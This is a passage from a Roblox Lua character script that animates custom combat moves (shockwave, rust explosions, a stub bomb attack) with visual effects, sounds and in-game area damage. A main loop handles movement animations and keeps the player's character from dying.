		lhii.C0 = Clerp(lhii.C0, CFrame.new(-1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(5), math.rad(-70), math.rad(0)) * CFrame.Angles(math.rad(-5), math.rad(0), math.rad(0)), 1 / 3)
	end
	for i = 0, 0.25, 0.075 do
		sait()
		rjott.C0 = Clerp(rjott.C0, R0 * CFrame.new(0, 0, 0 + 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5), math.rad(0), math.rad(40)), 1 / 3)
		necc.C0 = Clerp(necc.C0, N0 * CFrame.new(0, 0, 0 + ((1) - 1)) * CFrame.Angles(math.rad(-5 - 3 * math.cos(Sinn / 12)), math.rad(0), math.rad(-40)), 1 / 3)
		rsoo.C0 = Clerp(rsoo.C0, CFrame.new(1.5, 0.5, 0 + 0.2 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(35 - 10 * math.cos(Sinn / 12)), math.rad(0 - 10 * math.cos(Sinn / 12)), math.rad(40 - 3 * math.cos(Sinn / 12))) * RS0, 1 / 3)
		lsoo.C0 = Clerp(lsoo.C0, CFrame.new(-1.5, 0.5, 0 - 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5 + 10 * math.cos(Sinn / 12)), math.rad(0 + 10 * math.cos(Sinn / 12)), math.rad(0 + 3 * math.cos(Sinn / 12))) * LS0, 1 / 3)
		rhii.C0 = Clerp(rhii.C0, CFrame.new(1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(0), math.rad(80), math.rad(0)) * CFrame.Angles(math.rad(-4), math.rad(0), math.rad(0)), 1 / 3)
		lhii.C0 = Clerp(lhii.C0, CFrame.new(-1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(5), math.rad(-70), math.rad(0)) * CFrame.Angles(math.rad(-5), math.rad(0), math.rad(0)), 1 / 3)
	end
	humm.AutoRotate = true
	CryEff = true
	WS = 16
	Atacc = false
end

function AttackTwo_RustyExplotions()
	Atacc = true
	WS = 8
	humm.AutoRotate = false
	local GYRO = II("BodyGyro",rott) GYRO.D = 25 GYRO.P = 20000 GYRO.MaxTorque = VV(0,4000000,0) GYRO.CFrame = CC.NW(rott.Position,mausee.Hit.p)
	coroutine.resume(coroutine.create(function() repeat sait() GYRO.CFrame = CC.NW(rott.Position,mausee.Hit.p)	until Atacc == false GYRO:Remove() end))
	repeat
	for i = 0, 1.25, 0.05 do
		sait()
		rjott.C0 = Clerp(rjott.C0, R0 * CFrame.new(0, 0, 0 + 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5), math.rad(0), math.rad(-20)), 1 / 3)
		necc.C0 = Clerp(necc.C0, N0 * CFrame.new(0, 0, 0 + ((1) - 1)) * CFrame.Angles(math.rad(0 - 3 * math.cos(Sinn / 12)), math.rad(0), math.rad(20)), 1 / 3)
		rsoo.C0 = Clerp(rsoo.C0, CFrame.new(1.5, 0.5, 0 + 0.2 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(-15 - 10 * math.cos(Sinn / 12)), math.rad(-20 - 10 * math.cos(Sinn / 12)), math.rad(0 - 3 * math.cos(Sinn / 12))) * RS0, 1 / 3)
		lsoo.C0 = Clerp(lsoo.C0, CFrame.new(-1.5, 0.5, 0 - 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(85 + 10 * math.cos(Sinn / 12)), math.rad(0 + 10 * math.cos(Sinn / 12)), math.rad(-20 + 3 * math.cos(Sinn / 12))) * LS0, 1 / 3)
		rhii.C0 = Clerp(rhii.C0, CFrame.new(1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(5), math.rad(80), math.rad(0)) * CFrame.Angles(math.rad(-4), math.rad(0), math.rad(0)), 1 / 3)
		lhii.C0 = Clerp(lhii.C0, CFrame.new(-1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(10), math.rad(-70), math.rad(0)) * CFrame.Angles(math.rad(-5), math.rad(0), math.rad(0)), 1 / 3)
	end
	coroutine.resume(coroutine.create(function()
	local start,endd = rcast(larr.CFrame*CC.NW(0,-1,0).p,((mausee.Hit.p))-larr.CFrame*CC.NW(0,-1,0).p, 300, charr)
	Sound(379225925,larr,2,0.8)
	for i = 1, 5 do
	Effecctz({Waits = math.random(55,70), Type = "Wave", S = VV(0.5,0.05,0.5), S2 = VV(5,0.1,5), Tran = 0.1*i, Tran2 = 1, CCrame = larr.CFrame*CC.NW(0,-1,0)*CC.AA(MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360))), Move = nil, RX = MM.RN(-1,1), RY = MM.RN(-1,1), RZ = MM.RN(-1,1), M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 0, SBoomerang = 5*i})
	end
	Lightning(larr.CFrame*CC.NW(0,-1,0).p,endd,15,3,BrickColor.new("Rust"),"CorrodedMetal",MM.RN(35,40),0.1,2,0,true,35,true,3)
	AoeDam(endd,15,25,17)
	for i = 1, 6 do
	Effecctz({Waits = math.random(35*i,40*i), Type = "Sphere", S = VV(0.5,0.5,0.5), S2 = VV(7.5*i,7.5*i,7.5*i), Tran = 0.1*i, Tran2 = 1, CCrame = CC.NW(endd), Move = nil, RX = 0, RY = 0, RZ = 0, M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 0, SBoomerang = 5*i})
	end
	for i = 1, 3 do
	Effecctz({Waits = math.random(35*i,40*i), Type = "Wave", S = VV(0.5,0.05,0.5), S2 = VV(30,0.1,30), Tran = 0.1*i, Tran2 = 1, CCrame = CC.NW(endd)*CC.AA(MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360))), Move = nil, RX = MM.RN(-1,1), RY = MM.RN(-1,1), RZ = MM.RN(-1,1), M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = 168513088, Pit = 0.7, Vol = 2, Boomerang = true, MBoomerang = 0, SBoomerang = 5*i})
	Effecctz({Waits = math.random(35*i,40*i), Type = "Wave", S = VV(0.5,0.05,0.5), S2 = VV(30,0.1,30), Tran = 0.1*i, Tran2 = 1, CCrame = CC.NW(endd)*CC.AA(MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360))), Move = nil, RX = MM.RN(-1,1), RY = MM.RN(-1,1), RZ = MM.RN(-1,1), M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = 186772924, Pit = 0.95, Vol = 2.5, Boomerang = true, MBoomerang = 0, SBoomerang = 5*i})
	end
	for i = 1, 12 do
	Effecctz({Waits = math.random(55,70), Type = "Sphere", S = VV(1,15,1), S2 = VV(7,135,7), Tran = 0.05*i, Tran2 = 1, CCrame = CC.NW(endd)*CC.AA(MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360)),MM.RD(MM.RN(0,360))), Move = nil, RX = MM.RN(-0.75,0.75), RY = MM.RN(-0.75,0.75), RZ = MM.RN(-0.75,0.75), M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 0, SBoomerang = 15})
	end
	end))
	for i = 0, 0.5, 0.075 do
		sait()
		Effecctz({Waits = math.random(35,40), Type = "Crystal", S = VV(0,6,0), S2 = VV(1,3,1), Tran = 0, Tran2 = 1, CCrame = larr.CFrame*CC.NW(0,-1,0)*CC.AA(MM.RD(MM.RN(-360,360)),MM.RD(MM.RN(-360,360)),MM.RD(MM.RN(-360,360))), Move = larr.CFrame*CC.NW(0,-1,0)*CC.NW(MM.RN(-11,11),MM.RN(-11,3),MM.RN(-11,11)).p, RX = MM.RN(-2.5,2.5), RY = MM.RN(-2.5,2.5), RZ = MM.RN(-2.5,2.5), M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 35, SBoomerang = 35})
		rjott.C0 = Clerp(rjott.C0, R0 * CFrame.new(0, 0, 0 + 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5), math.rad(0), math.rad(-15)), 1 / 3)
		necc.C0 = Clerp(necc.C0, N0 * CFrame.new(0, 0, 0 + ((1) - 1)) * CFrame.Angles(math.rad(0 - 3 * math.cos(Sinn / 12)), math.rad(0), math.rad(15)), 1 / 3)
		rsoo.C0 = Clerp(rsoo.C0, CFrame.new(1.5, 0.5, 0 + 0.2 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(-7.5 - 10 * math.cos(Sinn / 12)), math.rad(-10 - 10 * math.cos(Sinn / 12)), math.rad(0 - 3 * math.cos(Sinn / 12))) * RS0, 1 / 3)
		lsoo.C0 = Clerp(lsoo.C0, CFrame.new(-1.5, 0.5, 0 - 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(115 + 10 * math.cos(Sinn / 12)), math.rad(0 + 10 * math.cos(Sinn / 12)), math.rad(-15 + 3 * math.cos(Sinn / 12))) * LS0, 1 / 3)
		rhii.C0 = Clerp(rhii.C0, CFrame.new(1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(5), math.rad(80), math.rad(0)) * CFrame.Angles(math.rad(-4), math.rad(0), math.rad(0)), 1 / 3)
		lhii.C0 = Clerp(lhii.C0, CFrame.new(-1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(10), math.rad(-70), math.rad(0)) * CFrame.Angles(math.rad(-5), math.rad(0), math.rad(0)), 1 / 3)
	end
	until KH == false
	humm.AutoRotate = true
	WS = 16
	Atacc = false
end

function AttackThree_Bomb()
	Atacc = true
	WS = 4
	humm.AutoRotate = false
	CryEff = false
	local GYRO = II("BodyGyro",rott) GYRO.D = 25 GYRO.P = 20000 GYRO.MaxTorque = VV(0,4000000,0) GYRO.CFrame = CC.NW(rott.Position,mausee.Hit.p)
	coroutine.resume(coroutine.create(function() repeat sait() GYRO.CFrame = CC.NW(rott.Position,mausee.Hit.p)	until Atacc == false GYRO:Remove() end))
	CryEff = true
	humm.AutoRotate = true
	WS = 16
	Atacc = false
end

mausee.Button1Down:connect(function()
	H = true
end)

mausee.Button1Up:connect(function()
	H = false
end)

mausee.KeyDown:connect(function(KKK)
	KKK = KKK:lower()
	KH = true
	if KKK == 'f' and Atacc == false then	
	AttackOne_ShockWave()
	elseif KKK == 'z' and Atacc == false then
	AttackTwo_RustyExplotions()
	elseif KKK == 'c' and Atacc == false then
	AttackThree_Bomb()
	end
end)

mausee.KeyUp:connect(function()
	KH = false
end)

charr.Animate.Parent = nil
humm.Animator.Parent = nil
while true do
	sait()
	Sinn=Sinn+Plus
	local TorsVel = (rott.Velocity * VV(1, 0, 1)).magnitude
	local Hit,Pos = rcast(rott.Position,(CC.NW(rott.Position, rott.Position + VV(0, -1, 0))).lookVector, 4, charr)
	local walkspd = 16 / (humm.WalkSpeed / 16)
	if Anim == "Wak" and (rott.Velocity * Vector3.new(1, 0, 1)).magnitude > 1 then
		rjott.C1 = Clerp(rjott.C1, R0 * CFrame.new(0, 0, 0.1 + 0.05 * math.cos(Sinn / (8/2))) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 2 * (humm.WalkSpeed / 16) / 3)
		necc.C1 = Clerp(necc.C1, CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(180)) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0) - hedd.RotVelocity.Y / 30), 0.2 * (humm.WalkSpeed / 16) / 3)
		rhii.C1 = Clerp(rhii.C1, CFrame.new(0.5, 1 - 0.125 * math.sin(Sinn / 8) - 0.15 * math.cos(Sinn / 8*2), 0.25 * math.sin(Sinn / 8)) * CFrame.Angles(math.rad(-5), math.rad(90), math.rad(0)) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0+25 * math.cos(Sinn / 8))), 0.6 / 3)
		lhii.C1 = Clerp(lhii.C1, CFrame.new(-0.5, 1 + 0.125 * math.sin(Sinn / 8) - 0.15 * math.cos(Sinn / 8*2), -0.25 * math.sin(Sinn / 8)) * CFrame.Angles(math.rad(-5), math.rad(-90), math.rad(0)) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0+25 * math.cos(Sinn / 8))), 0.6 / 3)
	elseif (Anim ~= "Wak") or ((rott.Velocity * Vector3.new(1, 0, 1)).magnitude < 1) then
		rjott.C1 = Clerp(rjott.C1, R0 * CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.2 / 3)
		necc.C1 = Clerp(necc.C1, CFrame.new(0, -0.5, 0) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(180)) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.2 / 3)
		rhii.C1 = Clerp(rhii.C1, CFrame.new(0.5, 1, 0) * CFrame.Angles(math.rad(0), math.rad(90), math.rad(0)) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.7 / 3)
		lhii.C1 = Clerp(lhii.C1, CFrame.new(-0.5, 1, 0) * CFrame.Angles(math.rad(0), math.rad(-90), math.rad(0)) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.7 / 3)
	end
		if rott.Velocity.y > 1 and Hit == nil then 
			Anim = "Jup"
			if Atacc == false then
				rjott.C0 = Clerp(rjott.C0, R0 * CFrame.new(0, 0, 0 ) * CFrame.Angles(math.rad(-10), math.rad(0), math.rad(0)), 1 / 3)
				necc.C0 = Clerp(necc.C0, N0 * CFrame.new(0, 0 , 0 + ((1) - 1)) * CFrame.Angles(math.rad(-5), math.rad(0), math.rad(0)), 1 / 3)
				rsoo.C0 = Clerp(rsoo.C0, CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(50), math.rad(0), math.rad(25 + 10 * math.cos(Sinn / 12))) * RS0, 1 / 3)
				lsoo.C0 = Clerp(lsoo.C0, CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(50), math.rad(0), math.rad(-25 - 10 * math.cos(Sinn / 12))) * LS0, 1 / 3)
				rhii.C0 = Clerp(rhii.C0, CFrame.new(1, -0.4, -0.6) * CFrame.Angles(math.rad(1), math.rad(90), math.rad(0)) * CFrame.Angles(math.rad(-1 * math.sin(Sinn / 6)), math.rad(0), math.rad(0)), 1 / 3)
				lhii.C0 = Clerp(lhii.C0, CFrame.new(-1, -1, 0) * CFrame.Angles(math.rad(0), math.rad(-85), math.rad(0)) * CFrame.Angles(math.rad(-1 * math.sin(Sinn / 6)), math.rad(0), math.rad(0)), 1 / 3)
			end
		elseif rott.Velocity.y < -1 and Hit == nil then 
			Anim = "Fal"
			if Atacc == false then
				rjott.C0 = Clerp(rjott.C0, R0 * CFrame.new(0, 0, 0 ) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 1 / 3)
				necc.C0 = Clerp(necc.C0, N0 * CFrame.new(0, 0 , 0 + ((1) - 1)) * CFrame.Angles(math.rad(-10), math.rad(0), math.rad(0)), 1 / 3)
				rsoo.C0 = Clerp(rsoo.C0, CFrame.new(1.5, 0.5, 0) * CFrame.Angles(math.rad(35 - 4 * math.cos(Sinn / 6)), math.rad(0), math.rad(45 + 10 * math.cos(Sinn / 12))) * RS0, 1 / 3)
				lsoo.C0 = Clerp(lsoo.C0, CFrame.new(-1.5, 0.5, 0) * CFrame.Angles(math.rad(35 - 4 * math.cos(Sinn / 6)), math.rad(0), math.rad(-45 - 10 * math.cos(Sinn / 12))) * LS0, 1 / 3)
				rhii.C0 = Clerp(rhii.C0, CFrame.new(1, -0.3, -0.7) * CFrame.Angles(math.rad(-25 + 5 * math.sin(Sinn / 12)), math.rad(90), math.rad(0)) * CFrame.Angles(math.rad(-1 * math.sin(Sinn / 6)), math.rad(0), math.rad(0)), 1 / 3)
				lhii.C0 = Clerp(lhii.C0, CFrame.new(-1, -0.8, -0.3) * CFrame.Angles(math.rad(-10), math.rad(-80), math.rad(0)) * CFrame.Angles(math.rad(-1 * math.sin(Sinn / 6)), math.rad(0), math.rad(0)), 1 / 3)
			end
		elseif (rott.Velocity * Vector3.new(1, 0, 1)).magnitude < 1 and Hit ~= nil then
			Anim = "Ide"
			if Atacc == false then
				change = 1
				rjott.C0 = Clerp(rjott.C0, R0 * CFrame.new(0, 0, 0 + 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5), math.rad(0), math.rad(0)), 1 / 3)
				necc.C0 = Clerp(necc.C0, N0 * CFrame.new(0, 0, 0 + ((1) - 1)) * CFrame.Angles(math.rad(0 - 3 * math.cos(Sinn / 12)), math.rad(0), math.rad(0)), 1 / 3)
				rsoo.C0 = Clerp(rsoo.C0, CFrame.new(1.5, 0.5, 0 + 0.2 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5 - 10 * math.cos(Sinn / 12)), math.rad(0 - 10 * math.cos(Sinn / 12)), math.rad(0 - 3 * math.cos(Sinn / 12))) * RS0, 1 / 3)
				lsoo.C0 = Clerp(lsoo.C0, CFrame.new(-1.5, 0.5, 0 - 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5 + 10 * math.cos(Sinn / 12)), math.rad(0 + 10 * math.cos(Sinn / 12)), math.rad(0 + 3 * math.cos(Sinn / 12))) * LS0, 1 / 3)
				rhii.C0 = Clerp(rhii.C0, CFrame.new(1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(5), math.rad(80), math.rad(0)) * CFrame.Angles(math.rad(-4), math.rad(0), math.rad(0)), 1 / 3)
				lhii.C0 = Clerp(lhii.C0, CFrame.new(-1, -1 - 0.05 * math.cos(Sinn / 12), 0) * CFrame.Angles(math.rad(10), math.rad(-70), math.rad(0)) * CFrame.Angles(math.rad(-5), math.rad(0), math.rad(0)), 1 / 3)
			end
		elseif (rott.Velocity * Vector3.new(1, 0, 1)).magnitude > 2 and Hit ~= nil then
			Anim = "Wak"
			if Atacc == false then
				rjott.C0 = Clerp(rjott.C0,R0 * CFrame.new(0, 0, 0 + 0.05 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5), math.rad(0 + 2.5 * math.cos(Sinn / 12)), math.rad(0)), 1 / 3)
				necc.C0 = Clerp(necc.C0, N0 * CFrame.new(0, 0, 0 + ((1) - 1)) * CFrame.Angles(math.rad(0 - 3 * math.cos(Sinn / 12)), math.rad(0 - 2.5 * math.cos(Sinn / 12)), math.rad(0)), 1 / 3)
				rsoo.C0 = Clerp(rsoo.C0, CFrame.new(1.5, 0.5, 0 + 0.2 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5 - 35 * math.cos(Sinn / 12)), math.rad(0 - 20 * math.cos(Sinn / 12)), math.rad(0 - 5 * math.cos(Sinn / 12))) * RS0, 1 / 3)
				lsoo.C0 = Clerp(lsoo.C0, CFrame.new(-1.5, 0.5, 0 - 0.2 * math.cos(Sinn / 12)) * CFrame.Angles(math.rad(5 + 35 * math.cos(Sinn / 12)), math.rad(0 - 20 * math.cos(Sinn / 12)), math.rad(0 + 5 * math.cos(Sinn / 12))) * LS0, 1 / 3)
				rhii.C0 = Clerp(rhii.C0, CFrame.new(1 , -1, 0) * CFrame.Angles(math.rad(0), math.rad(85), math.rad(0)) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 1 / 3)
				lhii.C0 = Clerp(lhii.C0, CFrame.new(-1, -1, 0) * CFrame.Angles(math.rad(0), math.rad(-85), math.rad(0)) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 1 / 3)
			end
		end
	if charr:FindFirstChild("Shield") == nil then
	Shield = Instance.new ("MeshPart", charr) Shield.Name = "Shield" Shield.CanCollide = false Shield.Transparency = 1 Shield.Material = "Neon" Shield.BrickColor = BrickColor.new("Really red") Shield.Size = Vector3.new(7,7,7) Shield.Massless = true Shield.CFrame = torss.CFrame
	local Wed = Instance.new("Weld", Shield) Wed.Part0 = Shield Wed.Part1 = torss
	end
	if charr:FindFirstChild("Shield2") == nil then
	Shield2 = Instance.new ("MeshPart", charr) Shield2.Name = "Shield2" Shield2.CanCollide = false Shield2.Transparency = 1 Shield2.Material = "Neon" Shield2.BrickColor = BrickColor.new("Really red") Shield2.Size = Vector3.new(6,6,6) Shield2.Massless = true Shield2.CFrame = torss.CFrame
	local Wed = Instance.new("Weld", Shield2) Wed.Part0 = Shield2 Wed.Part1 = torss
	end
	for _, c in pairs(charr:GetChildren()) do if c:IsA("BasePart") and c ~= rott then c.Anchored = false end end
	humm.Name="nil" humm.PlatformStand=false humm.MaxHealth = 500 humm.Health = 500
	if charr:FindFirstChildOfClass("ForceField")then charr:FindFirstChildOfClass("ForceField").Visible=false else Instance.new("ForceField",charr).Name=""end 
	humm:SetStateEnabled("Dead",false)humm:SetStateEnabled(Enum.HumanoidStateType.Dead, false)humm:SetStateEnabled("GettingUp",true)humm:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)humm:SetStateEnabled("Ragdoll",false) humm:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
	if MM.RN(1,3) == 1 and CryEff == true then
		Effecctz({Waits = math.random(55,110), Type = "Crystal", S = VV(0.5,1,0.5), S2 = VV(0,2,0), Tran = 0, Tran2 = 1, CCrame = rarr.CFrame*CC.NW(0,-1,0)*CC.AA(MM.RD(MM.RN(-360,360)),MM.RD(MM.RN(-360,360)),MM.RD(MM.RN(-360,360))), Move = rarr.CFrame*CC.NW(0,-1,0)*CC.NW(MM.RN(-7,7),MM.RN(-7,1),MM.RN(-7,7)).p, RX = MM.RN(-2.5,2.5), RY = MM.RN(-2.5,2.5), RZ = MM.RN(-2.5,2.5), M = "CorrodedMetal", C = BrickColor.new("Rust").Color, ID = nil, Pit = nil, Vol = nil, Boomerang = true, MBoomerang = 25, SBoomerang = 15})
	end
	humm.WalkSpeed = WS
	EpicMus.SoundId = "rbxassetid://"..EpicId
	EpicMus.Looped = true
	EpicMus.Pitch = EpicPit
	EpicMus.Volume = EpicVol
	EpicMus.Playing = true
	local EpicMusPos = EpicMus.TimePosition
	if EpicMus.Parent ~= rott or EpicMus == nil or not EpicMus then
		EpicMus = II("Sound",rott)
		EpicMus.TimePosition = EpicMusPos
	end
end
